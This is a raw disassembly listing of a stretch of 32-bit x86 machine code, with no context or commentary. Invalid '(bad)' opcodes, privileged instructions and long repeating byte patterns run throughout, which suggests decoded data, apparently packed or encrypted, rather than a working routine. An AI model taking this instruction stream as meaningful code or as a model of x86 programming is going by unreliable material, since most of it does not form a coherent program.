  404722:	jnp    0x4046af
  404724:	icebp  
  404725:	mov    ebp,0xda3c53c8
  40472a:	sbb    cl,BYTE PTR [esi]
  40472c:	inc    ebx
  40472d:	push   edi
  40472e:	mov    esp,0x5f88834
  404733:	add    ah,cl
  404735:	inc    eax
  404736:	inc    ecx
  404737:	inc    eax
  404738:	inc    ebx
  404739:	bound  esp,QWORD PTR ds:0x41400043
  40473f:	add    BYTE PTR [eax],al
  404741:	add    eax,0x43624062
  404746:	inc    ecx
  404747:	inc    eax
  404748:	inc    eax
  404749:	inc    eax
  40474a:	add    eax,0x40624340
  40474f:	add    eax,0x40664140
  404754:	arpl   si,cx
  404756:	xor    esi,DWORD PTR [ecx]
  404758:	test   al,0xee
  40475a:	inc    ecx
  40475b:	inc    ecx
  40475c:	push   esp
  40475d:	sbb    bh,bh
  40475f:	dec    edx
  404760:	cli    
  404761:	bound  edi,QWORD PTR ds:0x41a60550
  404767:	xor    DWORD PTR [edx],ecx
  404769:	bound  eax,QWORD PTR [edi+eax*4+0x43]
  40476d:	add    BYTE PTR ds:0x41107840,al
  404773:	bound  eax,QWORD PTR [eax+0x40]
  404776:	sldt   WORD PTR [eax-0x34]
  40477a:	js     0x4047de
  40477c:	add    eax,0x40664143
  404781:	inc    ebx
  404782:	add    BYTE PTR [ecx+0x5],al
  404785:	js     0x4047c7
  404787:	bound  eax,QWORD PTR [eax+0x0]
  40478a:	inc    eax
  40478b:	retf   
  40478c:	or     DWORD PTR [ecx],edx
  40478e:	sub    BYTE PTR [edx+0x63],ah
  404791:	les    ebx,FWORD PTR [ecx+edx*2-0x53]
  404795:	(bad)  
  404796:	push   ebx
  404797:	mov    esp,0xc9d7747a
  40479c:	push   ds
  40479d:	xor    eax,0xa8f93f
  4047a2:	mov    esi,0x9357ca42
  4047a7:	inc    ebp
  4047a8:	inc    eax
  4047a9:	sahf   
  4047aa:	push   edi
  4047ab:	adc    eax,0x71
  4047ae:	push   ebx
  4047af:	bound  eax,QWORD PTR [eax+0x2e]
  4047b2:	xor    BYTE PTR [esp+esi*1],bh
  4047b5:	push   ecx
  4047b6:	push   ecx
  4047b7:	adc    DWORD PTR [eax-0x68],eax
  4047ba:	ins    DWORD PTR es:[edi],dx
  4047bb:	or     eax,0xcb42b117
  4047c0:	into   
  4047c1:	test   al,0xe5
  4047c3:	retf   
  4047c4:	fwait
  4047c5:	inc    ecx
  4047c6:	inc    ebx
  4047c7:	inc    eax
  4047c8:	inc    eax
  4047c9:	add    eax,0x434162
  4047ce:	inc    eax
  4047cf:	add    BYTE PTR [edx+0x5],ah
  4047d2:	inc    eax
  4047d3:	adc    BYTE PTR [edx+0x40],ah
  4047d6:	inc    ebx
  4047d7:	inc    ecx
  4047d8:	add    eax,0x4340
  4047dd:	add    eax,0x404162
  4047e2:	add    BYTE PTR [eax+0x43],al
  4047e5:	inc    eax
  4047e6:	add    eax,0x44bcdd13
  4047eb:	lods   al,BYTE PTR ds:[esi]
  4047ec:	cmp    BYTE PTR [ecx+0x6a],bl
  4047ef:	xor    ebx,DWORD PTR [ecx-0x5]
  4047f2:	inc    esi
  4047f3:	retf   
  4047f4:	bound  esi,QWORD PTR ds:0xcf584daa
  4047fa:	aam    0x15
  4047fc:	in     eax,dx
  4047fd:	mov    esp,0x4073
  404802:	inc    ecx
  404803:	inc    ebx
  404804:	add    eax,0x41784062
  404809:	inc    eax
  40480a:	inc    eax
  40480b:	add    BYTE PTR [edi],cl
  40480d:	bound  eax,QWORD PTR [ebx+0x0]
  404810:	add    eax,0x25006240
  404815:	inc    eax
  404816:	add    eax,0x40254143
  40481b:	add    eax,0x3d620000
  404820:	das    
  404821:	gs pop ebp
  404823:	inc    edx
  404824:	cmp    BYTE PTR ds:0xb0be2a0e,al
  40482a:	aam    0xea
  40482c:	inc    ebx
  40482d:	jnp    0x4047f8
  40482f:	shl    DWORD PTR [edx*1-0x4b37fbc6],cl
  404836:	inc    eax
  404837:	dec    ebp
  404838:	aam    0xd5
  40483a:	repnz pop esi
  40483c:	jl     0x404883
  40483e:	inc    eax
  40483f:	adc    DWORD PTR [ecx],eax
  404841:	mov    edx,0x43d9
  404846:	add    BYTE PTR [ecx+0x40],al
  404849:	bound  esp,QWORD PTR [esi+0x0]
  40484c:	inc    eax
  40484d:	add    eax,0x5400000
  404852:	inc    ecx
  404853:	inc    eax
  404854:	inc    eax
  404855:	bound  esp,QWORD PTR ds:0x25050043
  40485b:	inc    ecx
  40485c:	inc    ebx
  40485d:	inc    eax
  40485e:	test   BYTE PTR [eax+0x0],al
  404861:	bound  ebx,QWORD PTR [eax+0x62]
  404864:	inc    ecx
  404865:	inc    eax
  404866:	inc    eax
  404867:	test   al,0xf7
  404869:	inc    eax
  40486a:	mov    edi,0x40312e45
  40486f:	inc    ebx
  404870:	push   eax
  404871:	inc    eax
  404872:	das    
  404873:	adc    dh,BYTE PTR [eax+esi*1]
  404876:	jo     0x4048aa
  404878:	arpl   WORD PTR [eax+0x74],ax
  40487b:	jg     0x4048e2
  40487d:	fs inc ecx
  40487f:	mov    ah,0x71
  404881:	inc    eax
  404882:	ins    DWORD PTR es:[edi],dx
  404883:	or     DWORD PTR [ebx],esi
  404885:	inc    eax
  404886:	fisttp WORD PTR [ebx]
  404888:	test   eax,0x34b11e40
  40488d:	arpl   bp,ax
  40488f:	(bad)  
  404892:	xchg   ebp,eax
  404893:	push   ecx
  404894:	adc    BYTE PTR [edx+0x40],ah
  404897:	inc    ecx
  404898:	and    eax,0x40000500
  40489d:	inc    ebx
  40489e:	add    eax,0x40624041
  4048a3:	inc    ebx
  4048a4:	add    eax,0x43402541
  4048a9:	bound  eax,QWORD PTR [eax+0x43]
  4048ac:	int3   
  4048ad:	inc    eax
  4048ae:	bound  eax,QWORD PTR [eax]
  4048b0:	inc    ecx
  4048b1:	inc    eax
  4048b2:	inc    eax
  4048b3:	add    eax,0x5c754005
  4048b8:	inc    esi
  4048b9:	stos   DWORD PTR es:[edi],eax
  4048ba:	cdq    
  4048bb:	fist   WORD PTR [ecx+0x68]
  4048be:	fsub   QWORD PTR [ebp+0x44]
  4048c1:	test   al,0xaa
  4048c3:	adc    esi,edi
  4048c5:	cmp    edi,edi
  4048c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048c8:	lds    eax,FWORD PTR [edx+0x7c]
  4048cb:	imul   edx,DWORD PTR [ecx],0x42
  4048ce:	dec    esp
  4048cf:	loopne 0x40493e
  4048d1:	cli    
  4048d2:	fwait
  4048d3:	xor    eax,esi
  4048d5:	dec    eax
  4048d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048d7:	bound  esp,QWORD PTR [eax+ebx*8]
  4048da:	xchg   edx,eax
  4048db:	push   ebx
  4048dc:	sti    
  4048dd:	mov    al,0x67
  4048df:	loope  0x404925
  4048e1:	arpl   WORD PTR ds:0x4c52efd1,dx
  4048e7:	and    al,0xc4
  4048e9:	test   al,0xc8
  4048eb:	adc    DWORD PTR [ecx+0x2540623c],ebp
  4048f1:	add    BYTE PTR [esi+0x40],ah
  4048f4:	add    eax,0x40404143
  4048f9:	inc    ebx
  4048fa:	add    BYTE PTR [eax],al
  4048fc:	add    BYTE PTR [edx-0x34],ah
  4048ff:	inc    eax
  404900:	add    eax,0x40004041
  404905:	inc    ecx
  404906:	int3   
  404907:	add    BYTE PTR [ebx-0x7c],al
  40490a:	add    eax,0x5406240
  40490f:	(bad)  
  404910:	shr    BYTE PTR [edi+edx*1+0x35f81215],1
  404917:	xor    al,0x23
  404919:	retf   
  40491a:	test   al,0xcb
  40491c:	(bad)  
  40491d:	test   al,0x54
  40491f:	inc    eax
  404920:	ds adc eax,0xfe8ebc40
  404926:	hlt    
  404927:	fs test al,0x42
  40492a:	sub    al,BYTE PTR [ecx-0x76]
  40492d:	inc    ebx
  40492e:	xor    BYTE PTR [eax],bh
  404930:	dec    esp
  404931:	inc    eax
  404932:	inc    ecx
  404933:	push   edx
  404934:	test   al,0x40
  404936:	bound  ebx,QWORD PTR [eax+0x41]
  404939:	add    eax,0x40404340
  40493e:	inc    ebx
  40493f:	inc    eax
  404940:	test   BYTE PTR [eax],al
  404942:	add    eax,0x40624041
  404947:	inc    eax
  404948:	add    BYTE PTR [edx+0x5],ah
  40494b:	inc    ebx
  40494c:	add    BYTE PTR [eax+0x78],al
  40494f:	inc    ecx
  404950:	add    BYTE PTR [eax+0x41],bl
  404953:	bound  esi,QWORD PTR [edx-0x2fbebdc0]
  404959:	xchg   esi,eax
  40495a:	fcom   st(1)
  40495c:	add    DWORD PTR [ecx],esi
  40495e:	inc    ebp
  40495f:	imul   ecx,DWORD PTR ds:0x5d61bc20,0x4f
  404966:	and    al,0x38
  404968:	enter  0xd75,0x96
  40496c:	push   ebp
  40496d:	push   ecx
  40496e:	in     al,0x63
  404970:	jp     0x4049e6
  404972:	retf   
  404973:	push   0x61209f70
  404978:	xchg   esp,eax
  404979:	bound  esi,QWORD PTR [eax+eax*2+0x62cc0084]
  404980:	add    eax,0xcc840f41
  404985:	inc    ebx
  404986:	add    BYTE PTR [eax+0x0],al
  404989:	inc    eax
  40498a:	inc    eax
  40498b:	inc    eax
  40498c:	int3   
  40498d:	add    BYTE PTR ds:0x62404341,al
  404993:	pop    eax
  404994:	add    BYTE PTR [ebx+0x40],al
  404997:	bound  ecx,QWORD PTR [edi]
  404999:	inc    eax
  40499a:	inc    eax
  40499b:	jb     0x40492f
  40499d:	bound  eax,QWORD PTR [eax+0x40413367]
  4049a3:	outs   dx,BYTE PTR ds:[esi]
  4049a4:	pop    ss
  4049a5:	or     eax,0x47804e63
  4049aa:	inc    eax
  4049ab:	dec    eax
  4049ac:	mov    esi,0x79a87b28
  4049b1:	fadd   DWORD PTR [eax+0x70]
  4049b4:	pushf  
  4049b5:	add    BYTE PTR [eax],al
  4049b7:	inc    eax
  4049b8:	inc    eax
  4049b9:	cmovno eax,DWORD PTR ds:0x40056243
  4049c0:	int3   
  4049c1:	add    ah,cl
  4049c3:	inc    eax
  4049c4:	inc    eax
  4049c5:	bound  eax,QWORD PTR [ecx+0x0]
  4049c8:	add    BYTE PTR [edi],cl
  4049ca:	inc    ebx
  4049cb:	inc    eax
  4049cc:	inc    eax
  4049cd:	add    BYTE PTR [ecx+0x43],al
  4049d0:	add    eax,0x40256240
  4049d5:	bound  eax,QWORD PTR [eax]
  4049d7:	push   edi
  4049d8:	int3   
  4049d9:	push   0x34
  4049db:	mov    ah,0x3d
  4049dd:	sub    eax,0x25a0c4bf
  4049e2:	dec    esp
  4049e3:	add    eax,0x444045ec
  4049e8:	push   cs
  4049e9:	ins    BYTE PTR es:[edi],dx
  4049ea:	xor    cl,bl
  4049ec:	and    esi,edx
  4049ee:	inc    eax
  4049ef:	mov    ds:0x52f25291,al
  4049f4:	loope  0x4049eb
  4049f6:	dec    esi
  4049f7:	sbb    esp,DWORD PTR [edx+0x40]
  4049fa:	push   0x56ec841
  4049ff:	add    ah,cl
  404a01:	inc    eax
  404a02:	inc    ecx
  404a03:	inc    eax
  404a04:	inc    ebx
  404a05:	bound  esp,QWORD PTR ds:0x41400043
  404a0b:	add    BYTE PTR [eax],al
  404a0d:	add    eax,0x43624062
  404a12:	inc    ecx
  404a13:	inc    eax
  404a14:	inc    eax
  404a15:	inc    eax
  404a16:	add    eax,0x40624340
  404a1b:	add    eax,0x40664140
  404a20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a21:	(bad)  
  404a22:	int    0x10
  404a24:	bound  ecx,QWORD PTR [ebx+0xf]
  404a27:	inc    ebp
  404a28:	sub    al,0x51
  404a2a:	adc    DWORD PTR [ebx-0x40],ebp
  404a2d:	mov    esp,0xe0229b7f
  404a32:	xor    ebp,ebp
  404a34:	dec    ecx
  404a35:	adc    al,BYTE PTR [bp+si-0x18]
  404a39:	into   
  404a3a:	jle    0x4049e4
  404a3c:	and    eax,0x50043f6
  404a41:	inc    eax
  404a42:	js     0x404a54
  404a44:	inc    ecx
  404a45:	bound  eax,QWORD PTR [eax+0x40]
  404a48:	sldt   WORD PTR [eax-0x34]
  404a4c:	js     0x404ab0
  404a4e:	add    eax,0x40664143
  404a53:	inc    ebx
  404a54:	add    BYTE PTR [ecx+0x5],al
  404a57:	js     0x404a99
  404a59:	bound  eax,QWORD PTR [eax+0x0]
  404a5c:	inc    eax
  404a5d:	aad    0xb3
  404a5f:	inc    eax
  404a60:	test   al,0x62
  404a62:	adc    BYTE PTR [ecx],bh
  404a64:	cmc    
  404a65:	lods   eax,DWORD PTR ds:[esi]
  404a66:	inc    ecx
  404a67:	inc    edi
  404a68:	inc    edx
  404a69:	lds    edi,FWORD PTR [eax+ebp*4+0x5050392e]
  404a70:	push   0x4c
  404a72:	inc    ecx
  404a73:	adc    cl,ch
  404a75:	or     dh,BYTE PTR [ebx]
  404a77:	sbb    eax,0xa0fdcd67
  404a7c:	adc    DWORD PTR [eax],ecx
  404a7e:	inc    ecx
  404a7f:	aad    0xd3
  404a81:	mov    eax,0xb44b417c
  404a86:	cmp    eax,DWORD PTR [ecx-0x3c]
  404a89:	inc    ecx
  404a8a:	fs jle 0x404acb
  404a8d:	jo     0x404ad1
  404a8f:	pop    eax
  404a90:	pop    edx
  404a91:	and    BYTE PTR [ebx],cl
  404a93:	nop
  404a94:	test   DWORD PTR [ebx+0x41],edx
  404a97:	inc    ebx
  404a98:	inc    eax
  404a99:	inc    eax
  404a9a:	add    eax,0x434162
  404a9f:	inc    eax
  404aa0:	add    BYTE PTR [edx+0x5],ah
  404aa3:	inc    eax
  404aa4:	adc    BYTE PTR [edx+0x40],ah
  404aa7:	inc    ebx
  404aa8:	inc    ecx
  404aa9:	add    eax,0x4340
  404aae:	add    eax,0x404162
  404ab3:	add    BYTE PTR [eax+0x43],al
  404ab6:	inc    eax
  404ab7:	add    eax,0xcc203910
  404abc:	mov    al,0x62
  404abe:	dec    esp
  404abf:	cmp    esp,DWORD PTR [edi]
  404ac1:	push   ebx
  404ac2:	or     DWORD PTR [ebp-0x6b329fa3],esi
  404ac8:	ss push ecx
  404aca:	mov    eax,0xbc2a45c4
  404acf:	inc    esi
  404ad0:	inc    ecx
  404ad1:	gs push edi
  404ad3:	dec    edi
  404ad4:	cmp    BYTE PTR [eax],dh
  404ad6:	add    eax,0x4039
  404adb:	inc    ecx
  404adc:	inc    ebx
  404add:	add    eax,0x41784062
  404ae2:	inc    eax
  404ae3:	inc    eax
  404ae4:	add    BYTE PTR [edi],cl
  404ae6:	bound  eax,QWORD PTR [ebx+0x0]
  404ae9:	add    eax,0x25006240
  404aee:	inc    eax
  404aef:	add    eax,0x40254143
  404af4:	add    eax,0x72620000
  404af9:	jae    0x404b2a
  404afb:	inc    ebp
  404afc:	adc    BYTE PTR [esi-0x35],0x20
  404b00:	outs   dx,BYTE PTR ds:[esi]
  404b01:	inc    ecx
  404b02:	xor    al,0xb8
  404b04:	pop    ds
  404b05:	bound  edi,QWORD PTR [eax+0x7]
  404b08:	dec    ecx
  404b09:	rcr    DWORD PTR [ecx+0x352881c3],cl
  404b0f:	aad    0xf1
  404b11:	push   ebx
  404b12:	lock inc ebx
  404b14:	bound  eax,QWORD PTR [eax+0x3c]
  404b17:	cmp    BYTE PTR ds:0x2645371,dl
  404b1d:	lods   eax,DWORD PTR ds:[esi]
  404b1e:	mov    edx,0x3eaf1137
  404b23:	push   0x1dc37b80
  404b28:	add    al,BYTE PTR [edx+edx*2+0x63]
  404b2c:	bound  ebx,QWORD PTR [eax+0x51]
  404b2f:	(bad)  
  404b30:	rcl    ecx,cl
  404b32:	retf   
  404b33:	inc    ebx
  404b34:	add    BYTE PTR [eax],al
  404b36:	add    BYTE PTR [ecx+0x40],al
  404b39:	bound  esp,QWORD PTR [esi+0x0]
  404b3c:	inc    eax
  404b3d:	add    eax,0x5400000
  404b42:	inc    ecx
  404b43:	inc    eax
  404b44:	inc    eax
  404b45:	bound  esp,QWORD PTR ds:0x25050043
  404b4b:	inc    ecx
  404b4c:	inc    ebx
  404b4d:	inc    eax
  404b4e:	test   BYTE PTR [eax+0x0],al
  404b51:	bound  ebx,QWORD PTR [eax+0x62]
  404b54:	inc    ecx
  404b55:	inc    eax
  404b56:	cwde   
  404b57:	or     al,0x62
  404b59:	(bad)  
  404b5a:	xchg   esp,eax
  404b5b:	inc    edx
  404b5c:	push   ss
  404b5d:	in     eax,0xd0
  404b5f:	sub    BYTE PTR [eax],bl
  404b61:	dec    edi
  404b62:	enter  0x31b4,0x35
  404b66:	dec    ebx
  404b67:	push   esi
  404b68:	or     BYTE PTR [eax+0x62416e46],ch
  404b6e:	and    dh,BYTE PTR [edx+eiz*2]
  404b71:	or     eax,0x287640cf
  404b76:	xor    eax,0xd3430c1c
  404b7b:	push   edx
  404b7c:	inc    ecx
  404b7d:	xor    al,0xa8
  404b7f:	mov    edx,0xfd40ac9c
  404b84:	jg     0x404bf3
  404b86:	adc    ebx,eax
  404b88:	inc    ebp
  404b89:	or     eax,0xe87d3740
  404b8e:	imul   edi,DWORD PTR [esi+0x406210a5],0x5002541
  404b98:	add    BYTE PTR [eax+0x43],al
  404b9b:	add    eax,0x40624041
  404ba0:	inc    ebx
  404ba1:	add    eax,0x43402541
  404ba6:	bound  eax,QWORD PTR [eax+0x43]
  404ba9:	int3   
  404baa:	inc    eax
  404bab:	bound  eax,QWORD PTR [eax]
  404bad:	inc    ecx
  404bae:	inc    eax
  404baf:	inc    eax
  404bb0:	add    eax,0x4040cb05
  404bb5:	call   DWORD PTR [edx+0x7f]
  404bb8:	add    DWORD PTR ds:0x50504042,eax
  404bbe:	in     eax,0x62
  404bc0:	adc    al,0x86
  404bc2:	inc    eax
  404bc3:	fld    TBYTE PTR [edi-0x41]
  404bc6:	mov    WORD PTR ds:0xf5ff40f7,es
  404bcc:	inc    eax
  404bcd:	push   eax
  404bce:	sahf   
  404bcf:	leave  
  404bd0:	dec    eax
  404bd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bd2:	mov    WORD PTR [eax+0xab4bf7a],es
  404bd8:	jo     0x404bdf
  404bda:	or     eax,0xa10549e7
  404bdf:	inc    esp
  404be0:	pushf  
  404be1:	xchg   BYTE PTR [edi],dh
  404be3:	inc    edi
  404be4:	adc    BYTE PTR [esi+0x4062cd45],bh
  404bea:	and    eax,0x5406600
  404bef:	inc    ebx
  404bf0:	inc    ecx
  404bf1:	inc    eax
  404bf2:	inc    eax
  404bf3:	inc    ebx
  404bf4:	add    BYTE PTR [eax],al
  404bf6:	add    BYTE PTR [edx-0x34],ah
  404bf9:	inc    eax
  404bfa:	add    eax,0x40004041
  404bff:	inc    ecx
  404c00:	int3   
  404c01:	add    BYTE PTR [ebx-0x7c],al
  404c04:	add    eax,0x5406240
  404c09:	bound  esp,QWORD PTR [edx+0x40]
  404c0c:	(bad)
  404c0f:	sub    DWORD PTR ds:0xbca34698,ebp
  404c15:	ds inc ecx
  404c17:	nop
  404c18:	push   edx
  404c19:	adc    eax,0x494a05f8
  404c1e:	lock rsm 
  404c21:	retf   
  404c22:	xor    BYTE PTR [esi+0x5105e3dd],al
  404c28:	add    eax,0xfb405d9c
  404c2d:	jge    0x404c57
  404c2f:	jo     0x404bb7
  404c31:	or     eax,0x48fca2dd
  404c36:	inc    ecx
  404c37:	gs and al,0x47
  404c3a:	xchg   edx,eax
  404c3b:	add    eax,0x62402a62
  404c40:	pop    eax
  404c41:	inc    ecx
  404c42:	add    eax,0x40404340
  404c47:	inc    ebx
  404c48:	inc    eax
  404c49:	test   BYTE PTR [eax],al
  404c4b:	add    eax,0x40624041
  404c50:	inc    eax
  404c51:	add    BYTE PTR [edx+0x5],ah
  404c54:	inc    ebx
  404c55:	add    BYTE PTR [eax+0x78],al
  404c58:	inc    ecx
  404c59:	add    BYTE PTR [eax+0x41],bl
  404c5c:	(bad)  
  404c5d:	shr    BYTE PTR [eax-0x57],1
  404c60:	mov    cl,0x27
  404c62:	xchg   BYTE PTR [esi],cl
  404c64:	mov    edi,0x3005f77a
  404c69:	fld    QWORD PTR [eax-0x30]
  404c6c:	arpl   WORD PTR [ebp+0x68],di
  404c6f:	xchg   BYTE PTR [eax+0x63],ah
  404c72:	mov    eax,ds:0xffb46bd1
  404c77:	les    eax,FWORD PTR gs:[eax-0x7c]
  404c7b:	add    ah,cl
  404c7d:	bound  eax,QWORD PTR ds:0xcc840f41
  404c83:	inc    ebx
  404c84:	add    BYTE PTR [eax+0x0],al
  404c87:	inc    eax
  404c88:	inc    eax
  404c89:	inc    eax
  404c8a:	int3   
  404c8b:	add    BYTE PTR ds:0x62404341,al
  404c91:	pop    eax
  404c92:	add    BYTE PTR [ebx+0x40],al
  404c95:	bound  ecx,QWORD PTR [edi]
  404c97:	inc    eax
  404c98:	loopne 0x404c9f
  404c9a:	(bad)  
  404c9b:	jno    0x404cd4
  404c9d:	push   ecx
  404c9e:	test   al,0x4f
  404ca0:	and    BYTE PTR [esi-0x6082cd33],al
  404ca6:	add    eax,0x5e4015f4
  404cab:	xchg   esp,eax
  404cac:	adc    dl,BYTE PTR [ecx-0x7a]
  404caf:	add    eax,0xc020a0b1
  404cb4:	and    bl,BYTE PTR [edi+0x5597b7d]
  404cba:	inc    ecx
  404cbb:	repz pop eax
  404cbd:	out    dx,eax
  404cbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cbf:	pushf  
  404cc0:	fiadd  WORD PTR [esi+0xd06224]
  404cc6:	add    BYTE PTR [eax+0x40],al
  404cc9:	cmovno eax,DWORD PTR ds:0x40056243
  404cd0:	int3   
  404cd1:	add    ah,cl
  404cd3:	inc    eax
  404cd4:	inc    eax
  404cd5:	bound  eax,QWORD PTR [ecx+0x0]
  404cd8:	add    BYTE PTR [edi],cl
  404cda:	inc    ebx
  404cdb:	inc    eax
  404cdc:	inc    eax
  404cdd:	add    BYTE PTR [ecx+0x43],al
  404ce0:	add    eax,0x40256240
  404ce5:	bound  eax,QWORD PTR [eax]
  404ce7:	push   ecx
  404ce8:	add    eax,0x461505
  404ced:	or     al,0x15
  404cef:	lahf   
  404cf0:	xchg   bl,cl
  404cf2:	sub    BYTE PTR [eax-0x64],al
  404cf5:	xchg   ebx,eax
  404cf6:	xor    dl,BYTE PTR [ecx+0x2c]
  404cf9:	pushf  
  404cfa:	sub    BYTE PTR [ebx+0x62],dh
  404cfd:	call   0x15e6eccf
  404d02:	nop    DWORD PTR [eax+0x58b3122]
  404d09:	leave  
  404d0a:	cmc    
  404d0b:	bound  ecx,QWORD PTR [eax+ebp*2+0x41]
  404d0f:	push   ecx
  404d10:	xchg   BYTE PTR [ecx+0x4c],al
  404d13:	test   eax,0x77d1cc09
  404d18:	add    eax,0x4140cc00
  404d1d:	inc    eax
  404d1e:	inc    ebx
  404d1f:	bound  esp,QWORD PTR ds:0x41400043
  404d25:	add    BYTE PTR [eax],al
  404d27:	add    eax,0x43624062
  404d2c:	inc    ecx
  404d2d:	inc    eax
  404d2e:	inc    eax
  404d2f:	inc    eax
  404d30:	add    eax,0x40624340
  404d35:	add    eax,0x40664140
  404d3a:	sub    al,0x41
  404d3c:	xchg   esp,eax
  404d3d:	nop
  404d3e:	cmp    bh,bl
  404d40:	inc    edx
  404d41:	jno    0x404ce8
  404d43:	adc    al,0xe4
  404d45:	mov    edi,0x5e117f34
  404d4a:	add    eax,0xd4403acd
  404d4f:	mov    bh,0x7c
  404d51:	adc    DWORD PTR [esi+0x6241a89c],eax
  404d57:	(bad)  
  404d58:	shl    ecx,1
  404d5a:	and    DWORD PTR ds:0x116f4312,ecx
  404d60:	inc    ebx
  404d61:	add    BYTE PTR ds:0x41107840,al
  404d67:	bound  eax,QWORD PTR [eax+0x40]
  404d6a:	sldt   WORD PTR [eax-0x34]
  404d6e:	js     0x404dd2
  404d70:	add    eax,0x40664143
  404d75:	inc    ebx
  404d76:	add    BYTE PTR [ecx+0x5],al
  404d79:	js     0x404dbb
  404d7b:	bound  eax,QWORD PTR [eax+0x0]
  404d7e:	inc    eax
  404d7f:	bound  esi,QWORD PTR [esp+eiz*4-0x53d7be35]
  404d86:	out    0xb5,al
  404d88:	imul   eax,DWORD PTR ds:0x68834641,0x86417e62
  404d92:	inc    eax
  404d93:	adc    al,0xc0
  404d95:	push   esi
  404d96:	push   ebx
  404d97:	adc    esi,eax
  404d99:	dec    ecx
  404d9a:	dec    esp
  404d9b:	int    0x95
  404d9d:	inc    ecx
  404d9e:	inc    ebx
  404d9f:	inc    eax
  404da0:	inc    eax
  404da1:	add    eax,0x434162
  404da6:	inc    eax
  404da7:	add    BYTE PTR [edx+0x5],ah
  404daa:	inc    eax
  404dab:	adc    BYTE PTR [edx+0x40],ah
  404dae:	inc    ebx
  404daf:	inc    ecx
  404db0:	add    eax,0x4340
  404db5:	add    eax,0x404162
  404dba:	add    BYTE PTR [eax+0x43],al
  404dbd:	inc    eax
  404dbe:	add    eax,0xbd44caa8
  404dc3:	inc    eax
  404dc4:	rol    BYTE PTR [ebp+0x63],1
  404dc7:	adc    ecx,edi
  404dc9:	icebp  
  404dca:	addr16 jle 0x404db9
  404dcd:	inc    ecx
  404dce:	mov    ah,0xb8
  404dd0:	pop    edx
  404dd1:	aas    
  404dd2:	inc    eax
  404dd3:	hlt    
  404dd4:	jae    0x404dca
  404dd6:	aas    
  404dd7:	or     eax,0xf7605a1f
  404ddc:	test   al,0xe7
  404dde:	pop    ebp
  404ddf:	int    0x38
  404de1:	mov    cl,0x48
  404de3:	inc    edi
  404de4:	adc    ch,BYTE PTR [eax-0x2da2bb9e]
  404dea:	xor    edx,DWORD PTR ds:0x88cb1f98
  404df0:	inc    eax
  404df1:	add    BYTE PTR [eax],al
  404df3:	inc    ecx
  404df4:	inc    ebx
  404df5:	add    eax,0x41784062
  404dfa:	inc    eax
  404dfb:	inc    eax
  404dfc:	add    BYTE PTR [edi],cl
  404dfe:	bound  eax,QWORD PTR [ebx+0x0]
  404e01:	add    eax,0x25006240
  404e06:	inc    eax
  404e07:	add    eax,0x40254143
  404e0c:	add    eax,0xb0620000
  404e11:	xor    DWORD PTR [edx],eax
  404e13:	ins    DWORD PTR es:[edi],dx
  404e14:	adc    eax,0x61f846e6
  404e19:	pop    ds
  404e1a:	jae    0x404e5f
  404e1c:	retf   
  404e1d:	bound  edx,QWORD PTR [ecx+0x62]
  404e20:	div    DWORD PTR [ebx-0x4fa9febe]
  404e26:	retf   0x9848
  404e29:	add    al,0xf3
  404e2b:	xor    DWORD PTR [ebx+0x209549cb],ebp
  404e31:	bnd jb 0x404e9a
  404e34:	inc    esi
  404e35:	inc    esp
  404e36:	cmp    al,0x44
  404e38:	push   esi
  404e39:	adc    al,0x9f
  404e3b:	pusha  
  404e3c:	xchg   ch,dh
  404e3e:	ror    ch,0x43
  404e41:	add    BYTE PTR [eax],al
  404e43:	add    BYTE PTR [ecx+0x40],al
  404e46:	bound  esp,QWORD PTR [esi+0x0]
  404e49:	inc    eax
  404e4a:	add    eax,0x5400000
  404e4f:	inc    ecx
  404e50:	inc    eax
  404e51:	inc    eax
  404e52:	bound  esp,QWORD PTR ds:0x25050043
  404e58:	inc    ecx
  404e59:	inc    ebx
  404e5a:	inc    eax
  404e5b:	test   BYTE PTR [eax+0x0],al
  404e5e:	bound  ebx,QWORD PTR [eax+0x62]
  404e61:	inc    ecx
  404e62:	inc    eax
  404e63:	dec    ecx
  404e64:	push   ebx
  404e65:	inc    edx
  404e66:	leave  
  404e67:	push   eax
  404e68:	repz retf 
  404e6a:	mov    esp,0x4a9237b5
  404e6f:	arpl   WORD PTR gs:[edi+0x5f42c315],di
  404e76:	xor    al,0x40
  404e78:	cmc    
  404e79:	mov    edi,0x2f716e43
  404e7e:	mov    ebx,0x6fdc736a
  404e83:	hlt    
  404e84:	and    DWORD PTR [edx-0x61d68a99],eax
  404e8a:	xor    al,0x1
  404e8c:	mov    bl,0x57
  404e8e:	adc    BYTE PTR [edx+0x40],ah
  404e91:	inc    ecx
  404e92:	and    eax,0x40000500
  404e97:	inc    ebx
  404e98:	add    eax,0x40624041
  404e9d:	inc    ebx
  404e9e:	add    eax,0x43402541
  404ea3:	bound  eax,QWORD PTR [eax+0x43]
  404ea6:	int3   
  404ea7:	inc    eax
  404ea8:	bound  eax,QWORD PTR [eax]
  404eaa:	inc    ecx
  404eab:	inc    eax
  404eac:	inc    eax
  404ead:	add    eax,0x9c624705
  404eb2:	test   al,0xdd
  404eb4:	pop    es
  404eb5:	mov    bh,0xdd
  404eb7:	push   ss
  404eb8:	popa   
  404eb9:	sub    BYTE PTR [edx],dl
  404ebb:	dec    eax
  404ebc:	sub    edi,DWORD PTR [ebx-0xf]
  404ebf:	push   0xffffff88
  404ec1:	fild   DWORD PTR [ebp-0x1b]
  404ec4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ec5:	mov    cl,0x4d
  404ec7:	and    BYTE PTR [edi+0x53],0x9
  404ecb:	mov    ah,0xd6
  404ecd:	push   es
  404ece:	nop
  404ecf:	outs   dx,DWORD PTR ds:[esi]
  404ed0:	hlt    
  404ed1:	add    DWORD PTR [edx+0x40],esp
  404ed4:	and    eax,0x5406600
  404ed9:	inc    ebx
  404eda:	inc    ecx
  404edb:	inc    eax
  404edc:	inc    eax
  404edd:	inc    ebx
  404ede:	add    BYTE PTR [eax],al
  404ee0:	add    BYTE PTR [edx-0x34],ah
  404ee3:	inc    eax
  404ee4:	add    eax,0x40004041
  404ee9:	inc    ecx
  404eea:	int3   
  404eeb:	add    BYTE PTR [ebx-0x7c],al
  404eee:	add    eax,0x5406240
  404ef3:	bound  ecx,QWORD PTR [ebp+ecx*1-0x6e9f8eb8]
  404efa:	add    eax,0x56c96269
  404eff:	pop    ebp
